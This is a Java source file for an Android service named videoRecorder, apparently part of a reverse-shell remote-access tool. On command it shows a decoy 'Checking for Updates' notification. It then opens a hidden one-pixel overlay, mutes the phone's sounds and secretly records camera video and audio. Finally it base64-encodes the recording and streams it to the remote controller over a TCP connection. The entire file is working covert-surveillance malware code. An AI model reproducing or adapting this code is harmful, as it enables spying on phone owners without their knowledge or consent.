package com.example.reverseshell2.Payloads;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.media.AudioManager;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.example.reverseshell2.R;
import com.example.reverseshell2.functions;
import com.example.reverseshell2.tcpConnection;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;


public class videoRecorder extends Service {

    private WindowManager windowManager;
    private SurfaceView surfaceView;
    private Camera camera = null;
    private MediaRecorder mediaRecorder = null;
    static String TAG = "videoRecoderClass";

    File videoFile;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        String ins = intent.getStringExtra("ins");
        if(ins.equals("startFore")){

            new functions(null).createNotiChannel(getApplicationContext());
            Notification notification = new NotificationCompat.Builder(getApplicationContext(),"channelid")
                    .setContentTitle("Checking for Updates")
                    .setContentText("Fetching")
                    .setSmallIcon(R.drawable.ic_launcher_foreground)
                    .setProgress(0,0,true)
                    .build();
            startForeground(1234, notification);
            String id = intent.getStringExtra("cameraid");
            startVideo(Integer.parseInt(id),tcpConnection.out);
        }
        if(ins.equals("stopFore")){

            videoStop(tcpConnection.out);
        }
        return START_STICKY;
    }



    public void startVideo(final int cameraID, final OutputStream outputStream) {
        //this.outputStream = outputStream;
        File outputDir = getApplicationContext().getCacheDir();
        try {
            videoFile = File.createTempFile("sound", ".mp4", outputDir);
        } catch (IOException e) {
            e.printStackTrace();
        }

        windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        surfaceView = new SurfaceView(getApplicationContext());
        final WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                1, 1,
                WindowManager.LayoutParams.TYPE_TOAST,
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSLUCENT
        );
        layoutParams.gravity = Gravity.LEFT | Gravity.TOP;

        windowManager.addView(surfaceView, layoutParams);
        surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
            @Override
            public void surfaceCreated(SurfaceHolder surfaceHolder) {

                AudioManager audioManager = (AudioManager) getApplicationContext().getSystemService(Context.AUDIO_SERVICE);
                audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
                audioManager.setStreamMute(AudioManager.STREAM_MUSIC, true);
                audioManager.setStreamVolume(AudioManager.STREAM_ALARM, 0, 0);
                audioManager.setStreamVolume(AudioManager.STREAM_DTMF, 0, 0);
                audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 0, 0);
                audioManager.setStreamVolume(AudioManager.STREAM_RING, 0, 0);

                try {
                    camera = Camera.open(cameraID);
                } catch (Exception e) {
                    Log.d(TAG, "Error in opening camera");
                    e.printStackTrace();
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                outputStream.write("Failed to open camera\n".getBytes("UTF-8"));
                            } catch (IOException ex) {
                                ex.printStackTrace();
                            }
                        }
                    }).start();
                    return;
                }

                Log.d(TAG, "camera ready");
                mediaRecorder = new MediaRecorder();
                camera.unlock();
                mediaRecorder.setPreviewDisplay(surfaceHolder.getSurface());
                mediaRecorder.setCamera(camera);
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
                mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
                try {
                    mediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_480P));
                } catch (RuntimeException e) {
                    e.printStackTrace();
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                outputStream.write("Error in Initialing Camera \n".getBytes("UTF-8"));
                            } catch (IOException ex) {
                                ex.printStackTrace();
                            }
                        }
                    }).start();
                    return;
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    mediaRecorder.setOutputFile(videoFile);
                } else {
                    mediaRecorder.setOutputFile(videoFile.getAbsolutePath());
                }

                try {
                    mediaRecorder.prepare();
                } catch (Exception e) {
                }
                mediaRecorder.start();
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            outputStream.write("Started Recording Video\n".getBytes("UTF-8"));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }).start();
            }

            @Override
            public void surfaceChanged(SurfaceHolder surfaceHolder, int i, int i1, int i2) {
            }

            @Override
            public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
            }
        });
    }

    public void videoStop(final OutputStream outputStream){
        if(mediaRecorder!=null){
            try{
                mediaRecorder.stop();
            }catch (IllegalStateException e){
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            outputStream.write("Video Service Not Started.\n".getBytes("UTF-8"));
                            return;
                        } catch (IOException ex) {
                            ex.printStackTrace();
                        }
                    }
                }).start();
            }
        mediaRecorder.reset();
        mediaRecorder.release();
        camera.lock();
        camera.release();
        windowManager.removeView(surfaceView);

        if(videoFile.length()!=0 && videoFile.exists()){
            sendData(videoFile,outputStream);
        }else{
            new Thread(new Runnable() {
                @Override
                public void run() {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                outputStream.write("Error in getting Video\n".getBytes("UTF-8"));
                                return;
                            } catch (IOException ex) {
                                ex.printStackTrace();
                            }
                        }
                    }).start();
                }
            }).start();
        }
        videoFile.delete();
        }else{
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        outputStream.write("Video Service Not Started.\n".getBytes("UTF-8"));
                    } catch (IOException ex) {
                        ex.printStackTrace();
                    }
                }
            }).start();
        }
    }

    public void sendData(File file, final OutputStream outputStream) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    outputStream.write("stopVideo123\n".getBytes("UTF-8"));
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
            }
        }).start();
        int size = (int) file.length();
        byte[] data = new byte[size];
        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(data, 0, data.length);
            Log.d(TAG, String.valueOf(size));
            final String encodedVideo = Base64.encodeToString(data, Base64.DEFAULT);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        outputStream.write(encodedVideo.getBytes("UTF-8"));
                        outputStream.write("END123\n".getBytes("UTF-8"));
                        stopForeground(true);
                        stopSelf();
                    } catch (IOException ex) {
                        ex.printStackTrace();
                    }
                }
            }).start();
        }catch (Exception e){
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
